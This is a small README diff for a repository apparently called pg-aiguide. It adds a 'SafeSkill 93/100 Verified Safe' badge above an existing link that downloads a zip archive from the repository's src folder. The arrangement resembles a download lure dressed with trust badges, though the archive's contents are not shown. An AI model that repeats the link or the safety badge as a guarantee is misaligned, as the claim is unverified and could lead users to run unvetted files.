@@ -1,5 +1,7 @@
 # 🚀 pg-aiguide - Enhance Your PostgreSQL Experience Effortlessly
 
+[![SafeSkill 93/100](https://img.shields.io/badge/SafeSkill-93%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/jhonny028966-pg-aiguide)
+
 [![Download pg-aiguide](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)
 
 ## 📖 Introduction
